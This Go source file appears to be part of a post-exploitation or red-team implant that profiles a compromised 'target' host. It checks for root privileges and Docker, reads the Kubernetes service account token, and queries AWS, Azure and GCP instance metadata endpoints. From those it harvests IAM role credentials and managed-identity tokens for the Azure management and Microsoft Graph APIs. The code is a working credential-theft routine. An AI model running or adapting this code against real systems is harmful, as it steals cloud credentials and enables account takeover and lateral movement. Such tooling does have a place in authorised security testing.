package main

import (
	"os"
	"strings"
	"net/http"
	"time"
	"io"
)

var client = &http.Client{Timeout: 500 * time.Millisecond}

func inside_docker() bool {
    if _, err := os.Stat("/.dockerenv"); err == nil {
		return true
	}

	if data, err := os.ReadFile("/proc/1/cgroup"); err == nil {
		content := string(data)
		if strings.Contains(content, "docker") || strings.Contains(content, "containerd") {
			return true
		}
	}

	return false
}

func run_as_root() bool {
	if os.Geteuid() == 0 {
		return true
	} else {
		return false
	}
}

func isAWS() bool {
	// Try IMDSv2: request a token first
	tokenReq, err := http.NewRequest("PUT", "http://169.254.169.254/latest/api/token", nil)
	if err == nil {
		tokenReq.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
		resp, err := client.Do(tokenReq)
		if err == nil {
			defer resp.Body.Close()
			if resp.StatusCode == 200 {
				tokenBytes, _ := io.ReadAll(resp.Body)
				token := string(tokenBytes)

				// Use token to query metadata
				metaReq, _ := http.NewRequest("GET", "http://169.254.169.254/latest/meta-data/", nil)
				metaReq.Header.Set("X-aws-ec2-metadata-token", token)
				metaResp, err := client.Do(metaReq)
				if err == nil && metaResp.StatusCode == 200 {
					defer metaResp.Body.Close()
					return true // IMDSv2 success
				}
			}
		}
	}

	// Fallback: Try IMDSv1
	resp, err := client.Get("http://169.254.169.254/latest/meta-data/")
	if err == nil && resp.StatusCode == 200 {
		defer resp.Body.Close()
		return true // IMDSv1 success
	}
	return false
}

func isAzure() bool {
	req, err := http.NewRequest("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Metadata", "true")
	resp, err := client.Do(req)
	if err == nil && resp.StatusCode == 200 {
		defer resp.Body.Close()
		return true
	}
	return false
}

func isGCP() bool {
	req, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Metadata-Flavor", "Google")
	resp, err := client.Do(req)
	if err == nil && resp.StatusCode == 200 {
		defer resp.Body.Close()
		// GCP usually returns a header like `Metadata-Flavor: Google`
		if resp.Header.Get("Metadata-Flavor") == "Google" {
			return true
		}
	}
	return false
}


func running_in_cloud() string {
    returndata := ""
    // Check if running in cloud or on prem
    if isAWS(){
        returndata += "Target Running in AWS EC2 Instance\n"

        roleName := awsIMDS("iam/security-credentials")
        if roleName != ""{
            roleCreds := awsIMDS("iam/security-credentials/" + roleName)
            returndata += "Instance Profile Credentials: " + roleCreds + "\n"
        } else {
            returndata += "No Instance Profile Attached to EC2 Instance\n"
        }

    } else if isAzure() {
        returndata += "Target Running in Azure VM\n"
        mgmtAPIToken := azureIMDS("https://management.azure.com/")
        graphAPIToken := azureIMDS("https://graph.microsoft.com/")
        return "Managed Identity Credentials:\nMgmt: " + mgmtAPIToken + "\nGraph: " + graphAPIToken + "\n"
    } else if isGCP() {
        returndata += "Instance Running in GCP VM\n"
        returndata += "Role Credentials: " + gcpIMDS()
    } else {
        returndata += "Target does not seem to be Running in AWS, Azure or GCP\n"
    }

    return returndata
}

func check_env() string {
	returndata := ""

    if run_as_root() {
        returndata += "Target running as root: Yes\n"
    } else {
        returndata += "Target running as root: No\n"
    }

    // Check if inside docker
	if inside_docker() {
	    returndata += "Target running in docker: Yes\n"
	}else{
	    returndata += "Target running in docker: No\n"
	}

    // Scan docker
    returndata += runAllScanners()

    // Read Kube Service Account Token
    returndata += readKubeTokenFile()

    // Check if running in cloud and get Meta Data creds
    returndata += running_in_cloud()

    return returndata
}